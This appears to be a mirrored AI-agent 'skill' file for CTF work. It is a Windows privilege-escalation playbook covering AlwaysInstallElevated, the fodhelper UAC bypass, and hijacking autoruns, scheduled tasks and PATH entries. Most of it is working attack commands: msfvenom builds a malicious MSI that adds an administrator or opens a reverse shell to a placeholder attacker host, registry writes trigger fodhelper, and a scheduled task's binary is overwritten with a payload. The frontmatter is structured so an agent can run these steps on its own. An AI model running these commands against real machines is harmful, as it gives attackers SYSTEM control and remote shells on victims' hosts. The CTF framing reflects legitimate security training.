# UAC Bypass, AlwaysInstallElevated & Registry/Autorun Abuse

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-windows/uac-and-registry.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-windows/uac-and-registry.md)

---

---
name: uac-and-registry
category: host-windows
triggers: ["AlwaysInstallElevated", "UAC bypass", "fodhelper", "autoruns", "scheduled tasks", "writable PATH", "msiexec elevated", "registry hijack", "startup folder", "schtasks"]
tools: ["reg", "msiexec", "msfvenom", "schtasks", "powershell", "accesschk.exe", "icacls", "cmd"]
priority: high
description: Escalate via AlwaysInstallElevated, UAC bypasses (fodhelper), and hijackable autoruns, scheduled tasks, and writable PATH/binary directories.
---
# UAC Bypass, AlwaysInstallElevated & Registry/Autorun Abuse

## Trigger context
Enumeration flagged `AlwaysInstallElevated=1`, a UAC-limited admin token, or a writable autorun/scheduled-task/PATH entry that a higher-priv user or SYSTEM will execute. Distinguish two situations: (a) you are a *low-priv user* leveraging a misconfig to reach SYSTEM, vs (b) you are an *admin in a UAC-filtered token* and just need to elevate (integrity bump, not a true privilege boundary in CTF terms).

## Objective
Get code execution in a high-integrity/SYSTEM context by: AlwaysInstallElevated MSI, a UAC bypass (fodhelper and friends) when holding a filtered admin token, or hijacking a writable autorun / scheduled task / PATH directory that runs as SYSTEM or another user.

## Methodology (decision tree)
1. Check AlwaysInstallElevated - if BOTH HKLM and HKCU keys are 1, install a malicious MSI as SYSTEM. Highest-value, works for low-priv users.
2. Are you a member of Administrators but running unelevated (medium integrity)? -> UAC bypass (fodhelper) for a high-integrity shell.
3. Enumerate autoruns / Run keys / Startup folder / scheduled tasks / services for entries whose target file OR directory you can write, that run as SYSTEM or an admin -> hijack the binary.
4. Enumerate PATH for a writable directory that precedes a legitimate binary's location -> planting/hijacking.
5. Trigger (reboot, task schedule, logon) and verify.

## Commands & payloads
AlwaysInstallElevated - check both keys must be 0x1:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
# build the elevated MSI on attacker
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o evil.msi
# or a reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATK LPORT=443 -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```
UAC bypass - fodhelper (filtered admin token -> high integrity, fileless):
```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Windows\Temp\rev.exe" /f
start fodhelper.exe
REM cleanup:
reg delete "HKCU\Software\Classes\ms-settings" /f
```
Enumerate autoruns / Run keys / startup:
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
accesschk.exe /accepteula -wvu "C:\Path\To\AutorunTarget.exe"
```
Scheduled tasks - find and inspect for writable actions running as SYSTEM/admin:
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
schtasks /query /tn "\VulnTask" /fo list /v
accesschk.exe /accepteula -quv "C:\Path\task_binary.exe"
REM overwrite the task's binary if writable, then wait for its trigger
copy /y rev.exe "C:\Path\task_binary.exe"
```
Writable PATH / directory abuse:
```cmd
echo %PATH%
REM for each dir, test write + precedence:
accesschk.exe /accepteula -dwvu "C:\Some\PathDir"
icacls "C:\Some\PathDir"
REM if writable and earlier in PATH than the real binary, plant a same-named exe/DLL
```
PowerShell equivalents:
```powershell
Get-ScheduledTask | ? {$_.Principal.UserId -match 'SYSTEM'} | Select TaskName,TaskPath
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
```

## Branching logic
- AlwaysInstallElevated both = 1 -> MSI path, fastest SYSTEM.
- Only one of the two keys set -> NOT exploitable; move on.
- Admin-but-filtered token -> fodhelper (or computerdefaults / eventvwr / sdclt variants if fodhelper is patched/blocked).
- Writable autorun/task/PATH target that a *different* user runs -> hijack, then wait for their logon/schedule.
- Nothing here -> return to `windows-enum-winpeas`; consider `service-misconfigurations` (services are a sibling autorun class) and `token-impersonation-potato`.

## Common pitfalls
- AlwaysInstallElevated requires BOTH HKCU and HKLM keys = 1; one alone does nothing.
- fodhelper only elevates an account already in Administrators (filtered token) - it is not a low-priv-to-admin jump; do not expect it to help a plain user.
- UAC-bypass registry keys under HKCU must be cleaned up or they persist/alert.
- Scheduled-task hijack needs the task to actually trigger (schedule/logon/idle) within your window; check `Next Run Time`.
- PATH hijack only works if your writable dir is searched *before* the legitimate binary's directory.
- msiexec payload may be flagged by AppLocker/WDAC; `/quiet /qn` avoids UI hangs.
- Some "autoruns" run at user logon only, not as SYSTEM - check the run-as principal before investing.

## Proof / verification
- After MSI/UAC-bypass, `whoami /groups` shows High Mandatory Level / `whoami` shows SYSTEM, or new admin membership in `net localgroup administrators`.
- Hijacked task/autorun: confirm your payload dropped a SYSTEM-owned artifact (`icacls`) after the trigger.

## Cross-references
- [sa--instructions--host-windows--windows-enum-winpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--windows-enum-winpeas.md)
- [sa--instructions--host-windows--service-misconfigurations.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--service-misconfigurations.md)
- [sa--instructions--host-windows--token-impersonation-potato.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--token-impersonation-potato.md)
- [sa--instructions--host-windows--credential-hunting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--credential-hunting.md)

## Credible sources
- HackTricks - UAC bypass: https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html
- HackTricks - AlwaysInstallElevated: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- PayloadsAllTheThings - Windows Privilege Escalation (AlwaysInstallElevated, autoruns, scheduled tasks): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- UACME (UAC bypass technique reference): https://github.com/hfiref0x/UACME
- LOLBAS - fodhelper.exe: https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/
- LOLBAS - msiexec.exe: https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
